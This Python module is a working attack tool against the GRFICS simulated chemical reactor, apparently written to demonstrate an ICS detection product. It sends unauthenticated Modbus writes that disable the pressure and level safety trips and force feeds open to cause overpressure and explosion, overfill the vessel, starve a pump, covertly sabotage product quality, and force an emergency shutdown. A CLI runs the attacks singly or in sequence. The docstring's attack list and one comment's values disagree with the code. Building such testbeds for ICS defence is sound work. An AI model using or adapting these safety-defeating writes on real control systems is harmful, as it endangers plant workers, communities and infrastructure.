"""Attacks on the GRFICS chemical reactor - real unauthenticated Modbus writes.

Every attack is an FC05/FC06 write to the chemical PLC's holding registers /
coils (the same insecure Modbus the thermal plant exposes). Each one has a
VISIBLE consequence on the Unity 3D scene AND trips LogicWard's chemical drift
detector:

  defeat-protection : raise the pressure safety setpoint  -> protection disarmed
  valve-override    : feeds 100%, purge shut              -> pressure redlines
  overfill          : product shut, feeds high            -> tank overflows
  estop-injection   : force the emergency shutdown coil   -> plant slams down
  pump-kill         : force a feed pump off               -> feed disturbance

Usage:
    python -m logicward.sites.grfics.attacks --host H --port P <command>
"""
from __future__ import annotations

import socket
import struct
import sys
import time

from logicward.sites.grfics import points as pts


class ChemAttacker:
    def __init__(self, host: str = "127.0.0.1", port: int = 5021, unit: int = 1):
        self.host = host
        self.port = port
        self.unit = unit
        self._cmds: list[str] = []   # exact Modbus commands of the last attack

    def _modbus(self, pdu: bytes) -> bytes | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((self.host, self.port))
            s.sendall(struct.pack(">HHHB", 1, 0, len(pdu) + 1, self.unit) + pdu)
            data = s.recv(512)
            s.close()
            return data
        except OSError:
            return None

    def write_register(self, tag: str, eng_value: float) -> bool:
        p = pts.BY_TAG[tag]
        raw = max(0, min(65535, pts.raw(eng_value, tag)))
        self._cmds.append(f"FC06 write_holding @{p.address}={raw}  ({tag} -> {eng_value:g} {p.unit})")
        return self._modbus(struct.pack(">BHH", 0x06, p.address, raw)) is not None

    def write_coil(self, tag: str, on: bool) -> bool:
        p = pts.BY_TAG[tag]
        self._cmds.append(f"FC05 write_coil @{p.address}={'FF00' if on else '0000'}  ({tag} -> {'ON' if on else 'OFF'})")
        return self._modbus(struct.pack(">BHH", 0x05, p.address, 0xFF00 if on else 0x0000)) is not None

    def fire(self, name: str) -> dict:
        """Run attack `name`, returning its result plus the exact Modbus commands sent."""
        self._cmds = []
        r = getattr(self, ATTACKS[name])()
        r["commands"] = list(self._cmds)
        return r

    # -- named attacks (each drives a DISTINCT live signature on the SOC gauges) --
    def pressure_redline(self) -> dict:
        # THE FINALE. Defeat BOTH safety trips, force the feeds wide open and shut
        # the purge. With nothing relieving and nothing tripping, pressure rockets
        # to the vessel ceiling and the reactor BLASTS. Signature: catastrophic
        # overpressure -> explosion (the one attack the Unity binary visibly blows).
        s1 = self.write_register("Pressure_HH_SP", 4300.0)   # above the 4200 kPa ceiling
        s2 = self.write_register("Level_HH_SP", 130.0)       # defeat the level trip too
        a = self.write_register("Feed1_Valve_Cmd", 100.0)
        b = self.write_register("Feed2_Valve_Cmd", 100.0)
        c = self.write_register("Purge_Valve_Cmd", 0.0)
        return {"attack": "pressure-redline", "ok": s1 and s2 and a and b and c,
                "note": "All safety trips defeated + feeds forced open + purge shut - reactor overpressures and BLASTS"}

    def overfill(self) -> dict:
        # Shut the product outlet and drive both feeds high - the LEVEL rises until
        # the vessel overflows and the level trip fires. Signature: level gauge up,
        # product valve -> 0, feed valves -> 90.
        a = self.write_register("Product_Valve_Cmd", 0.0)
        b = self.write_register("Feed1_Valve_Cmd", 90.0)
        c = self.write_register("Feed2_Valve_Cmd", 90.0)
        return {"attack": "overfill", "ok": a and b and c,
                "note": "Product valve shut, feeds forced high - liquid level rises and overflows"}

    def pump_starve(self) -> dict:
        # Trip feed pump 1 and shut its feed valve - the reactor is STARVED: the
        # level drains and pressure falls (the opposite of overfill). Signature:
        # level gauge DOWN + feed-1 valve/dial -> 0.
        ok = self.write_coil("Feed_Pump_1", False)
        self.write_register("Feed1_Valve_Cmd", 0.0)
        return {"attack": "pump-starve", "ok": ok,
                "note": "Feed pump 1 tripped and its valve shut - reactor starved, liquid level drains away"}

    def quality_sabotage(self) -> dict:
        # Skew the feed ratio (Feed 1 up, Feed 2 down) keeping total inflow roughly
        # constant - level and pressure barely move (STEALTHY) but the feed valves
        # go asymmetric and the composition drifts. Signature: feed valve gauges
        # diverge (65 / 10) while everything else stays flat.
        a = self.write_register("Feed1_Valve_Cmd", 73.0)   # max skew, inflow ~unchanged
        b = self.write_register("Feed2_Valve_Cmd", 0.0)
        return {"attack": "quality-sabotage", "ok": a and b,
                "note": "Feed ratio skewed hard - composition swings, reactor liquid recolours (product ruined)"}

    def estop_injection(self) -> dict:
        # Force the emergency-shutdown coil - the plant halts instantly. The
        # datastore's ESD safe-state drops every reported valve to 0 (purge opens
        # to relieve), so all valve gauges slam to safe-state. Signature: instant
        # ESD, no prior excursion (distinct from overfill's level-rise-then-trip).
        ok = self.write_coil("Reactor_ESD", True)
        return {"attack": "estop-injection", "ok": ok,
                "note": "Emergency shutdown coil forced - plant slams to safe-state (denial of control)"}


ATTACKS = {
    "pressure-redline": "pressure_redline",
    "overfill": "overfill",
    "pump-starve": "pump_starve",
    "quality-sabotage": "quality_sabotage",
    "estop-injection": "estop_injection",
}


def main() -> None:
    import argparse
    ap = argparse.ArgumentParser(description="GRFICS chemical reactor attacks (Modbus)")
    ap.add_argument("command", choices=[*ATTACKS, "combo"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5021)
    args = ap.parse_args()
    atk = ChemAttacker(args.host, args.port)

    if args.command == "combo":
        # headline sequence — each step a distinct gauge signature
        for step in (atk.quality_sabotage, atk.pressure_redline, atk.overfill):
            print(step())
            time.sleep(2.0)
        return
    print(getattr(atk, ATTACKS[args.command])())


if __name__ == "__main__":
    main()
